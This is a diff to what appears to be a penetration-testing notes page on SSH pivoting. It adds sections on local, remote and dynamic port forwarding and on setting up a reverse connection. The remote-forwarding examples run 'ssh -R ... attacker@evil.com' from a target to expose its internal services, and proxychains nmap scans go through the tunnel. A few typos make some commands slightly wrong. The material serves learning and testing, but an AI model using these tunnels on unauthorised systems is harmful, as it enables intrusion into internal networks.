@@ -1,5 +1,5 @@
 ---
-description: Pivoting Using SSH
+description: Port Forwarding with SSH Pivoting Using SSH
 ---
 
 # SSH
@@ -337,3 +337,174 @@ nc -l -u -p 161 < /tmp/fifo | nc localhost 6666 > /tmp/fifo
 ```
 
 Now tools that use UDP (such as nmap UDP scans or snmp\_check) can communicate through the tunnel!
+
+## Port Forwarding with SSH <a href="#port-forwarding-with-ssh" id="port-forwarding-with-ssh"></a>
+
+SSH tunneling, also known as port forwarding, is a method of creating a tunnel between two endpoints through which traffic is forwarded.
+
+### Local Port Forwarding <a href="#local-port-forwarding" id="local-port-forwarding"></a>
+
+We can forward a port on the local machine to a port on the remote machine by adding the flag **"-L"** with SSH.\
+Also, it is required the remote SSH username/password.
+
+```shellscript
+ssh -L [<local-ip>:]<local-port>.<destination-ip>:<destination-port> remote-user@<remote-ip>
+
+# -f: Background
+# -N Do not execute remote commands
+ssh -L [<local-ip>:]<local-port>:<destination-ip>:<destination-port> remote-user@<remote-ip> -fN
+```
+
+#### Examples <a href="#examples" id="examples"></a>
+
+Below are some examples.
+
+```shellscript
+# We can access the internal webserver in the remote machin via http://127.0.0.1/
+sudo ssh -L 80:127.0.0.1:80 john@example.com
+sudo ssh -L localhost:80:127.0.0.1:80 john@example.com
+
+# We can connect the database on local port 3306
+ssh -L 3306:db.example.com:3306 john@example.com
+ssh -L localhost:3306:db.example.com:3306 john@example.com
+# Another port
+ssh -L 3336:db.example.com:3306 john@example.com
+
+# Multiple ports
+ssh -L 8001:127.0.0.1:8001 -L 9090:127.0.0.1:9090 john@example.com
+```
+
+#### Stop Local Port Forwarding <a href="#stop-local-port-forwarding" id="stop-local-port-forwarding"></a>
+
+To stop the local port forwarding if it is running background, find the process ID and specify it to **`kill`** command.
+
+```shellscript
+ps aux | grep ssh
+kill <PID>
+```
+
+### Remote Port Forwarding (Reverse Port Forwarding) <a href="#remote-port-forwarding-reverse-port-forwarding" id="remote-port-forwarding-reverse-port-forwarding"></a>
+
+We can forward a port on the remote machine to a port on the local machine by adding the flag **"-R"** with SSH.
+
+```
+ssh -R [<remote-ip>:]<remote-port>:<destination-ip>:<destination-port> remote-user@<remote-ip>
+```
+
+#### Examples <a href="#examples_1" id="examples_1"></a>
+
+Run the following command on remote (target) machine:
+
+```shellscript
+# Example 1
+ssh -R 8080:127.0.0.1:3000 attacker@evil.com
+# Now access to 127.0.0.1:3000 in local machine. That means taht we can access to 127.0.0.1:8080 of remote machine.
+
+# Example 2
+ssh -R 192.168.27.30:5555:127.0.0.1:4444 attacker@evil.com
+# Now access to 127.0.0.1:4444 in local machine. That means that we can access to the remote's internal service (192.168.27.30:5555).
+```
+
+### Dynamic Port Forwarding <a href="#dynamic-port-forwarding" id="dynamic-port-forwarding"></a>
+
+If we cannot determine the remote ports opened internally, we can find them using dynamic port forwarding.\
+First off, execute the dynamic port forwarding using ssh.
+
+```
+ssh -D 1337 remote-user@<remote-ip>
+```
+
+And update the configuration for Proxychains.\
+In **“/etc/proxychains.conf”**, comment out **“socks4 127.0.0.1 9050"** and add **“socks5 127.0.0.1 1337”** on the bottom of the file.
+
+```shellscript
+# socks4 127.0.0.1 9050
+socks5 127.0.0.1 1337
+```
+
+After that, try port scanning to find open ports of the remote machine over 127.0.0.1.
+
+```shellscript
+proxychains nmap 127.0.0.1
+```
+
+When we found the open ports, we can execute the Local Port Forwarding using the ports we found.\
+\*By the way, we can close the previous dynamic port forwarding if not necessary.
+
+```shellscript
+ssh -L <local-port>:127.0.0.1:<port-we-found> remote-user@<remote-ip>
+
+# e.g.
+# If we want to open port 80 in local, we need to run as root privilege.
+sudo ssh -L 80:127.0.0.1:80 john@example.com
+ssh -L 3306:127.0.0.1:3306 john@example.com
+```
+
+For instance, assume that the remote machine opens port 80 internally.\
+Now access http://127.0.0.1/. We can access the remote webserver.
+
+### Reverse Connection <a href="#reverse-connection" id="reverse-connection"></a>
+
+Reverse connections are often used in situations where the server needs to be accessible from the client's network, but the server's network is restricted. By initiating a reverse connection, the client can establish a connection to the server without the need for the server to be accessible on the public internet.
+
+#### 1. Generate SSH Keys in Remote Machine <a href="#id-1-generate-ssh-keys-in-remote-machine" id="id-1-generate-ssh-keys-in-remote-machine"></a>
+
+```shellscript
+ssh-keygen
+```
+
+Then save them (public key and private key) to arbitrary folder.
+
+```shellscript
+mkdir /home/remote-user/reverse-keys
+mv id_rsa /home/remote-user/reverse-keys
+mv id_rsa.pub /home/remote-user/reverse-keys
+```
+
+Copy the content of public key (id\_rsa.pug).
+
+#### 2. Add Content of Public Key to authorized\_key in Your Local Machine <a href="#id-2-add-content-of-public-key-to-authorized_key-in-your-local-machine" id="id-2-add-content-of-public-key-to-authorized_key-in-your-local-machine"></a>
+
+```shellscript
+echo 'content of publick key' >> ~/.ssh/authorized_key
+```
+
+To clarify that the key only for reverse connection, add the following line to this content in authorized\_key.
+
+```shellscript
+# ~/.ssh/authorized_key
+command="echo 'This account can only be used for port forwarding'",no-agent-forwarding,no-x11-forwarding,no-pty id-rsa
+AAAAAB3NzaC........
+```
+
+Check if SSH server is running.\
+If the server is not running, start SSH server.
+
+```shellscript
+sudo systemctl status ssh
+```
+
+#### 3. Run Reverse Proxy in Remote Machine <a href="#id-3-run-reverse-proxy-in-remote-machine" id="id-3-run-reverse-proxy-in-remote-machine"></a>
+
+Reverse port forwarding using the private key (id\_rsa)
+
+```shellscript
+ssh -R <local-port>:<remote-ip>:<remote-port> local-user@<local-ip> -i id_rsa -fN
+```
+
+#### 4. Confirmation in Your Local Machine <a href="#id-4-confirmation-in-your-local-machine" id="id-4-confirmation-in-your-local-machine"></a>
+
+You can access to **\\:\\**
+
+#### 5. Close Connection in Remote Machine <a href="#id-5-close-connection-in-remote-machine" id="id-5-close-connection-in-remote-machine"></a>
+
+After that, stop reverse connection.
+
+```shellscript
+ps aux | grep ssh
+sudo kill <PID>
+```
+
+### References <a href="#references" id="references"></a>
+
+* [Linuxize](https://linuxize.com/post/how-to-setup-ssh-tunneling/)
